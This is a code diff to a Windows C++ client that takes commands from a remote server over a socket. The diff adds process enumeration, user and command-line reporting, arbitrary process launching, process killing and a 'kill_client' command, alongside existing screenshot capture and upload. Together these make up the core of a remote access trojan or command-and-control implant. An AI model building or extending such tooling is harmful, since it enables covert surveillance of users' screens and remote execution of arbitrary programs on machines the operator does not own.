@@ -5,9 +5,10 @@
 #include <winsock2.h> // Include winsock2.h before windows.h
 #include <windows.h>
 #include <ws2tcpip.h>
-#include <objidl.h>  // For IStream
-#include <gdiplus.h> // Add GDI+ for screenshot capability
-#include <memory>    // For smart pointers
+#include <objidl.h>   // For IStream
+#include <gdiplus.h>  // Add GDI+ for screenshot capability
+#include <memory>     // For smart pointers
+#include <tlhelp32.h> // For process management functions
 
 // Link with required libraries
 #pragma comment(lib, "gdiplus.lib")
@@ -276,11 +277,195 @@ bool capture_and_send_screenshot(SOCKET sock)
     return (total_sent == streamSize);
 }
 
+// Add this function to get process information
+std::string get_process_info()
+{
+    std::string info = "Process Information:\n";
+
+    // Get current process ID
+    DWORD pid = GetCurrentProcessId();
+    info += "Process ID (PID): " + std::to_string(pid) + "\n";
+
+    // Get process name
+    char process_name[MAX_PATH] = {0};
+    DWORD size = MAX_PATH;
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+
+    if (hProcess)
+    {
+        if (QueryFullProcessImageNameA(hProcess, 0, process_name, &size))
+        {
+            // Extract just the filename from the full path
+            char *filename = strrchr(process_name, '\\');
+            if (filename)
+            {
+                filename++; // Skip the backslash
+            }
+            else
+            {
+                filename = process_name;
+            }
+            info += "Process Name: " + std::string(filename) + "\n";
+        }
+        else
+        {
+            info += "Process Name: Unable to retrieve\n";
+        }
+
+        // Get process creation time
+        FILETIME ftCreate, ftExit, ftKernel, ftUser;
+        if (GetProcessTimes(hProcess, &ftCreate, &ftExit, &ftKernel, &ftUser))
+        {
+            SYSTEMTIME stCreate;
+            FileTimeToSystemTime(&ftCreate, &stCreate);
+
+            char timeStr[100];
+            sprintf(timeStr, "%04d-%02d-%02d %02d:%02d:%02d",
+                    stCreate.wYear, stCreate.wMonth, stCreate.wDay,
+                    stCreate.wHour, stCreate.wMinute, stCreate.wSecond);
+
+            info += "Process Start Time: " + std::string(timeStr) + "\n";
+        }
+
+        CloseHandle(hProcess);
+    }
+    else
+    {
+        info += "Failed to open process for detailed information\n";
+    }
+
+    // Get command line
+    LPWSTR cmdLine = GetCommandLineW();
+    if (cmdLine)
+    {
+        // Convert wide string to narrow string
+        int size_needed = WideCharToMultiByte(CP_UTF8, 0, cmdLine, -1, NULL, 0, NULL, NULL);
+        std::string cmdLineStr(size_needed, 0);
+        WideCharToMultiByte(CP_UTF8, 0, cmdLine, -1, &cmdLineStr[0], size_needed, NULL, NULL);
+        cmdLineStr.resize(strlen(cmdLineStr.c_str()));
+
+        info += "Command Line: " + cmdLineStr + "\n";
+    }
+
+    // Get current directory
+    char curDir[MAX_PATH];
+    if (GetCurrentDirectoryA(MAX_PATH, curDir))
+    {
+        info += "Current Directory: " + std::string(curDir) + "\n";
+    }
+
+    // Get username
+    char username[256];
+    DWORD username_len = 256;
+    if (GetUserNameA(username, &username_len))
+    {
+        info += "Running as User: " + std::string(username) + "\n";
+    }
+
+    return info;
+}
+
+// Add these functions for process management
+
+// List all running processes
+std::string list_processes()
+{
+    std::string process_list = "Running Processes:\n";
+    process_list += "PID\tProcess Name\n";
+    process_list += "------------------------\n";
+
+    // Take a snapshot of all processes
+    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnap == INVALID_HANDLE_VALUE)
+    {
+        return "Failed to create process snapshot";
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    // Get the first process
+    if (!Process32First(hProcessSnap, &pe32))
+    {
+        CloseHandle(hProcessSnap);
+        return "Failed to get process information";
+    }
+
+    // Iterate through all processes
+    do
+    {
+        // Convert wide string to narrow string
+        char narrow_name[MAX_PATH];
+        WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, narrow_name, MAX_PATH, NULL, NULL);
+        process_list += std::to_string(pe32.th32ProcessID) + "\t" + std::string(narrow_name) + "\n";
+    } while (Process32Next(hProcessSnap, &pe32));
+
+    CloseHandle(hProcessSnap);
+    return process_list;
+}
+
+// Start a new process
+std::string start_process(const std::string &command)
+{
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Create a non-const copy of the command string
+    char *cmd = _strdup(command.c_str());
+
+    // Start the process
+    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+    {
+        free(cmd);
+        return "Failed to start process: " + std::to_string(GetLastError());
+    }
+
+    free(cmd);
+
+    // Close process and thread handles
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return "Process started successfully with PID: " + std::to_string(pi.dwProcessId);
+}
+
+// Terminate a process by PID
+std::string terminate_process(const std::string &pid_str)
+{
+    try
+    {
+        DWORD pid = std::stoi(pid_str);
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+
+        if (hProcess == NULL)
+        {
+            return "Failed to open process with PID " + pid_str + ": " + std::to_string(GetLastError());
+        }
+
+        if (!TerminateProcess(hProcess, 1))
+        {
+            CloseHandle(hProcess);
+            return "Failed to terminate process with PID " + pid_str + ": " + std::to_string(GetLastError());
+        }
+
+        CloseHandle(hProcess);
+        return "Process with PID " + pid_str + " terminated successfully";
+    }
+    catch (const std::exception &e)
+    {
+        return "Error: " + std::string(e.what());
+    }
+}
+
 int main()
 {
     // Initialize GDI+ at startup
     ULONG_PTR gdiplusToken;
-    GdiplusStartupInput gdiplusStartupInput;
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     gdiplusStartupInput.GdiplusVersion = 1;
     gdiplusStartupInput.DebugEventCallback = NULL;
     gdiplusStartupInput.SuppressBackgroundThread = FALSE;
@@ -356,6 +541,32 @@ int main()
                 response = get_sysinfo();
                 send(sock, response.c_str(), response.length(), 0);
             }
+            else if (strcmp(buffer, "procinfo") == 0)
+            {
+                std::cout << "Sending process information..." << std::endl;
+                response = get_process_info();
+                send(sock, response.c_str(), response.length(), 0);
+            }
+            else if (strcmp(buffer, "list_processes") == 0)
+            {
+                std::cout << "Listing all processes..." << std::endl;
+                response = list_processes();
+                send(sock, response.c_str(), response.length(), 0);
+            }
+            else if (strncmp(buffer, "start_process ", 14) == 0)
+            {
+                std::string command = buffer + 14;
+                std::cout << "Starting process: " << command << std::endl;
+                response = start_process(command);
+                send(sock, response.c_str(), response.length(), 0);
+            }
+            else if (strncmp(buffer, "terminate_process ", 18) == 0)
+            {
+                std::string pid = buffer + 18;
+                std::cout << "Terminating process with PID: " << pid << std::endl;
+                response = terminate_process(pid);
+                send(sock, response.c_str(), response.length(), 0);
+            }
             else if (strcmp(buffer, "screenshot") == 0)
             {
                 std::cout << "Taking screenshot..." << std::endl;
@@ -365,6 +576,21 @@ int main()
                     send(sock, error_msg, strlen(error_msg), 0);
                 }
                 std::cout << "Screenshot sent" << std::endl;
+            }
+            else if (strcmp(buffer, "kill_client") == 0)
+            {
+                std::cout << "Received kill command from server. Terminating..." << std::endl;
+                // Send acknowledgment before terminating
+                const char *ack_msg = "Client terminating on server request";
+                send(sock, ack_msg, strlen(ack_msg), 0);
+
+                // Clean up resources
+                closesocket(sock);
+                WSACleanup();
+                GdiplusShutdown(gdiplusToken);
+
+                // Force exit the process
+                ExitProcess(0);
             }
             else if (strcmp(buffer, "exit") == 0)
             {
@@ -389,4 +615,3 @@ int main()
     WSACleanup();
     return 0;
 }
-
